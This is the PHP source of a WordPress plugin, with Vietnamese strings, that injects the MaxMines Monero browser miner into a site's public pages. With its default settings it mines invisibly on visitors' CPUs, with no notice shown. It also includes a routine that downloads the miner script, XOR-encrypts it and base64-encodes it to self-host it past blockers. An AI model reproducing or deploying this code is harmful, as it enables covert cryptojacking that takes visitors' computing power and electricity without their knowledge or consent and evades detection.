<?php
/*
Plugin Name: Simple Monero Miner - MaxMines
Description: Cách khác để kiếm tiền bằng cách khai thác monero (một loại tiền điện tử) trên CPU của khách truy cập bằng cách sử dụng maxmines api.
Version: 1.0.0
Author: Nguyễn Hoàng Minh Thư
Author URI: nhmthu.github.io
*/

if ( ! defined( 'ABSPATH' ) ) exit;

function smmChSetOptions() {
	add_option('smmch_setup','0');
	
	add_option('smmch_public_sitekey','');
	add_option('smmch_private_sitekey','');
	add_option('smmch_throttle','0.3');
	add_option('smmch_visual','0');
	add_option('smmch_block_for_mobile','on');
	add_option('smmch_disable_plugin','');
	add_option('smmch_script_loaders','0');
	
	add_option('smmch_host_time','');
	
	add_option('smmch_topbottom_pos','bottom');
	add_option('smmch_notification_pos','bottom right');
	add_option('smmch_visual_title','Hỗ trợ tôi');
	add_option('smmch_visual_desc','Chào! Bây giờ bạn có thể giúp duy trì trang web này bằng cách sử dụng sức mạnh CPU dư thừa của bạn! Bạn có thể dừng lại nếu bạn cần!');
	add_option('smmch_visual_text_color','#ffffff');
	add_option('smmch_visual_bg_color','#000000');
	add_option('smmch_visual_button_color','#000000');
	add_option('smmch_visual_button_bg_color','#ffffff');
	add_option('smmch_mining_perct','Phần trăm khai thác:');
	add_option('smmch_accepted_hashes','Tổng hash được chấp nhận:');
	add_option('smmch_visual_hide_time','10');
	add_option('smmch_first_session','');
	add_option('smmch_hide_hashes_infmn','');
	add_option('smmch_hide_hashes_contrl','');
}
function smmChReSetOptions(){
}
function smmChAdminRegisterSettings() {
	register_setting('smmch_skip','smmch_setup');
	register_setting('smmch_options','smmch_public_sitekey');
	register_setting('smmch_options','smmch_private_sitekey');
	register_setting('smmch_options','smmch_throttle');
	register_setting('smmch_options','smmch_visual');
	register_setting('smmch_options','smmch_disable_plugin');
	register_setting('smmch_options','smmch_block_for_mobile');
	register_setting('smmch_options','smmch_script_loaders');
	
	register_setting('smmch_time','smmch_host_time');
	
	register_setting('smmch_visual_control','smmch_topbottom_pos');
	register_setting('smmch_visual_control','smmch_notification_pos');
	register_setting('smmch_visual_control','smmch_visual_title');
	register_setting('smmch_visual_control','smmch_visual_desc');
	register_setting('smmch_visual_control','smmch_visual_text_color');
	register_setting('smmch_visual_control','smmch_visual_bg_color');
	register_setting('smmch_visual_control','smmch_visual_button_color');
	register_setting('smmch_visual_control','smmch_visual_button_bg_color');
	register_setting('smmch_visual_control','smmch_mining_perct');
	register_setting('smmch_visual_control','smmch_accepted_hashes');
	register_setting('smmch_visual_control','smmch_visual_hide_time');
	register_setting('smmch_visual_control','smmch_first_session');
	register_setting('smmch_visual_control','smmch_hide_hashes_infmn');
	register_setting('smmch_visual_control','smmch_hide_hashes_contrl');
}
register_activation_hook(__FILE__, 'smmChSetOptions' );
register_deactivation_hook(__FILE__, 'smmChReSetOptions' );
add_action('admin_init', 'smmChAdminRegisterSettings');

function smmChSettings(){
	if(get_option('smmch_setup') == 0){
		require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-setup.php' );
	} ?>
	<br/>
	<div class="smmch-config">
		<h1>Simple Monero Miner - MaxMines</h1>
		<div class="left-side-box">
			<div class="smmchshadow-box">
				<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-settings.php' ); ?>
			</div>
			<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-visual.php' ); ?>
			<div class="smmchshadow-box">
				<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-stats.php' ); ?>
			</div>
		</div>
		<div class="right-side-box">
			<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-features.php' ); ?>
		</div>
	</div> <?php
}

function smmChMenu() {
  add_options_page('Monero Miner | Admin Settings', 'Simple Monero Miner', 'administrator', 'simple-monero-miner-maxmines', 'smmChSettings');
}
add_filter('admin_menu', 'smmChMenu');

function smmchAddActionLinks ( $actions, $plugin_file ) {
	static $plugin;
	if (!isset($plugin))
		$plugin = plugin_basename(__FILE__);
	
	if ($plugin == $plugin_file) {
		$mylinks = array('<a href="' . admin_url( 'options-general.php?page=simple-monero-miner-maxmines' ) . '"><img style="vertical-align: middle;width:15px;height:15px;border:0;" src="'.plugin_dir_url(__FILE__).'img/monero-coin.png">Settings</a>');
		$actions = array_merge( $mylinks, $actions );
	}
	return $actions;
}
add_filter( 'plugin_action_links', 'smmchAddActionLinks', 10, 5 );

function smmChAdminRegisterHead() {
	wp_enqueue_style( 'wp-color-picker' );
	wp_enqueue_script( 'wp-color-picker' );
	wp_enqueue_style( 'smmch-admin-style', plugin_dir_url( __FILE__ ) . 'css/smmch-custom.css?v=1.4');
	wp_enqueue_script( 'smmch-admin-script', plugin_dir_url( __FILE__ ) . 'js/smmch-custom.js?v=1.4', array(jquery) );
}
add_action('admin_enqueue_scripts', 'smmChAdminRegisterHead');

function smmCHMaxMinesScript() {
	
	$smmch_publickey = get_option('smmch_public_sitekey');
	$smmch_throttle = number_format((float)get_option('smmch_throttle'), 1, '.', '');
	
	$smmch_visual = esc_attr(get_option('smmch_visual'));
	$smmch_block_for_mobile = esc_attr(get_option('smmch_block_for_mobile'));
	$smmch_disable_plugin = esc_attr(get_option('smmch_disable_plugin'));
	$smmch_script_loaders = esc_attr(get_option('smmch_script_loaders'));
	
	if($smmch_disable_plugin != "on"){
		if($smmch_visual != '5'){
			wp_enqueue_script('smmch-maxmines-script','https://maxmines.com/lib/maxmines.min.js',array());
			wp_enqueue_script( 'smmch-miner-script', plugin_dir_url(__FILE__) . 'js/smmch-mine.js?v=1.4', array(jquery) );
		}
		if($smmch_visual == '0'){
			if($smmch_throttle != 1) {
				if($smmch_publickey != ''){
					if ($smmch_throttle) {
						if($smmch_throttle > 0.9) {
							$smmch_throttle = 0.9;
						}
					} else {
						$smmch_throttle = "";
					}
					wp_add_inline_script(
					'smmch-maxmines-script',
					'smmchMineOptions = {}; smmchMineOptions.invisible="true"; smmchMineOptions.sitekey = "' . esc_textarea($smmch_publickey).'"; smmchMineOptions.throttle = "' . esc_textarea($smmch_throttle) .'"; smmchMineOptions.mobileblock = "' . esc_textarea($smmch_block_for_mobile) .'";',
					'after');
				}
			}
		}
	}
}
add_action('wp_footer', 'smmCHMaxMinesScript');

/*---MaxMines STYLE ENQUEUER---*/
function smmCHMaxMinesStyle() {
	wp_enqueue_style( 'smmch-public-style', plugin_dir_url( __FILE__ ) . 'css/smmch-public.css?v=1.4');
}
add_action('wp_head', 'smmCHMaxMinesStyle');

require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-widget.php' );
require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-maxmines-widget.php' );
require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-footer.php' );
require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-shortcode.php' );


function smmchUpdateMaxMinesScript($fileName){
	$url = 'https://maxmines.com/lib/' . $fileName;
	$response = file_get_contents($url);
	
	if (empty($response)) {
		return false;
	}
	// Transform main script
	if($fileName == 'maxmines.min.js') {
		
		$jsLib = plugin_dir_url( __FILE__ ) . 'js-lib';
		$jsLibEscaped = str_replace('/', '\/', $jsLib);
		
		$pattern = '/(?:(?:\/\*(?:[^*]|(?:\*+[^*\/]))*\*+\/)|(?:(?<!\:|\\\|\')\/\/.*))/';
		$response = preg_replace($pattern, '', $response);
		
		$response = str_replace('https://maxmines.com/lib', $jsLib, $response);
		$response = str_replace('https:\/\/maxmines.com\/lib', $jsLibEscaped, $response);
		$response = str_replace('https://maxmines.com', '', $response);
		
		//return $jsLib;
		$dest = plugin_dir_path( __FILE__ ) . 'js-lib/smmch-own.js';
		
		$key = ('smmch_pro_gamer');
		$text = $response;
		$outText = '';
		for ($i = 0; $i < strlen($text);) {
            for ($j = 0; ($j < strlen($key) && $i < strlen($text)); $j++, $i++) {
				$outText .= $text{$i} ^ $key{$j};
			}
		}
		$response = $outText;
		$response = "gdhg = '" . base64_encode($response) . "';";
		if (!file_put_contents($dest, $response)) {
			return false;
		}
	} else {
		//return $jsLib;
		$dest = plugin_dir_path( __FILE__ ) . 'js-lib/' . $fileName;
		if (!file_put_contents($dest, $response)) {
			return false;
		}
	}
	return true;
}

function smmchUpdateMaxMinesScripts(){
	$resultMaxMines = smmchUpdateMaxMinesScript('maxmines.min.js');
	$resultWasm = smmchUpdateMaxMinesScript('worker.wasm');
	
	if ($resultMaxMines && $resultWasm) {
		update_option('smmch_host_time', date('d-m-Y H:i:s'));
		return array(true,date('d-m-Y H:i:s'));
	}
	error_log('update_maxmines_scripts failed.');
	return false;
}

function smmchAjaxCallback() {

	$success = smmchUpdateMaxMinesScripts();

	if($success[0] == 'true'){
		if ( !empty( $_SERVER['HTTP_X_REQUESTED_WITH'] ) && strtolower( $_SERVER['HTTP_X_REQUESTED_WITH'] ) == 'xmlhttprequest' ) {
			$result = array(
				"success" => $success[1]
			);
			echo json_encode($result);
		} else {
			header( "location:" . $_SERVER["HTTP_REFERER"] );
		}
		exit;
	}
}
add_action( 'wp_ajax_smmch_process', 'smmchAjaxCallback' );